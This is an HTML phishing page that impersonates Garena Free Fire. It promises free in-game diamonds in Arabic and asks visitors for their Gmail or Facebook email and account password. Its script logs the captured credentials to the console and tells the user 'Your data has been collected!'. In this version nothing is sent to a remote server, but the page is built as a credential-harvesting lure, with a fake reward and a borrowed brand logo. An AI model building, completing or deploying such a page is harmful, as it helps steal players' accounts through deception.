<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Freefire Best Reward Gifter</title>
    <link rel="stylesheet" href="styles.css"> <!-- Link to your CSS file -->
</head>
<body>
    <header>
        <img src="Logo_of_Garena_Free_Fire.png" alt="Top Image" class="top-image"> <!-- Replace with your image path -->
    </header>
    <main>
        <h1>مكافأة الماس المجانية من فري فاير</h1>
        <p>يرجى وضع معلومات حسابك في فري فاير أدناه لتأكيد هويتك.</p>
        
        <form id="infoForm">
            <input type="text" id="email" placeholder="Gmail/Facebook email" required>
            <input type="password" id="password" placeholder="كلمة مرور حسابك" required>
            <button type="submit">اقبل</button>
        </form>
    </main>
    
    <script>
        document.getElementById('infoForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent the default form submission

            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Log the email and password to the console for testing
            console.log('Email:', email);
            console.log('Password:', password);
            
            // Alert for demonstration purposes
            alert('Your data has been collected! Check the console for details.');
            
            // Optionally, clear the input fields after submission
            document.getElementById('infoForm').reset();
        });
    </script>
</body>
</html>
